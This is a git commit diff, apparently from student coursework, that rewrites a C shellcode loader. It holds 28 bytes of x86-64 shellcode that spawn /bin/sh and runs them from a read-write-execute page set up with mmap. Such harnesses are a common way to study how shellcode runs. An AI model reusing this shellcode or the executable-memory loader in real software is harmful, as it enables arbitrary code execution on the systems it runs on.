287d42079274886c8c9732711b677ab690b31886
Roman Moroz <morozdef24@gmail.com>
2025-12-17 17:44:15 +0300

    fix 4

--- arch_calc_sys/rgz/loader.c
+++ arch_calc_sys/rgz/loader.c
@@ -1,16 +1,42 @@
 #include <stdio.h>
+#include <string.h>
+#include <sys/mman.h> // Для mmap
+#include <unistd.h>   // Для sysconf
+#include <stdlib.h>   // Для exit
 
-// Глобальный массив с шелл-кодом
-unsigned char code[] = \
+// Твой рабочий шелл-код (28 байт)
+unsigned char shellcode[] = \
 "\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05";
 
 int main() {
-    printf("Shellcode Length: %ld\n", sizeof(code) - 1);
+    printf("Shellcode Length: %ld\n", sizeof(shellcode) - 1);
+
+    // 1. Получаем размер страницы памяти (обычно 4096 байт)
+    long page_size = sysconf(_SC_PAGESIZE);
     
-    // Прямая передача управления на адрес массива
-    // Мы приводим адрес массива к указателю на функцию и вызываем её
-    void (*ret)() = (void(*)())code;
-    ret();
+    // 2. Выделяем память через mmap
+    // PROT_EXEC | PROT_READ | PROT_WRITE  -> Разрешаем всё!
+    // MAP_ANONYMOUS -> Память только в RAM, не в файле
+    void *mem = mmap(NULL, page_size, 
+                     PROT_READ | PROT_WRITE | PROT_EXEC, 
+                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+    if (mem == MAP_FAILED) {
+        perror("Ошибка mmap");
+        exit(1);
+    }
+
+    printf("Memory allocated at: %p\n", mem);
+
+    // 3. Копируем шелл-код в эту выделенную область
+    memcpy(mem, shellcode, sizeof(shellcode) - 1);
+    printf("Shellcode copied to memory.\n");
+
+    // 4. Приводим указатель памяти к типу функции и вызываем её
+    printf("Executing shellcode...\n");
+    void (*func)() = (void (*)())mem;
     
+    func(); // <--- ПРЫЖОК СЮДА
+
     return 0;
 }
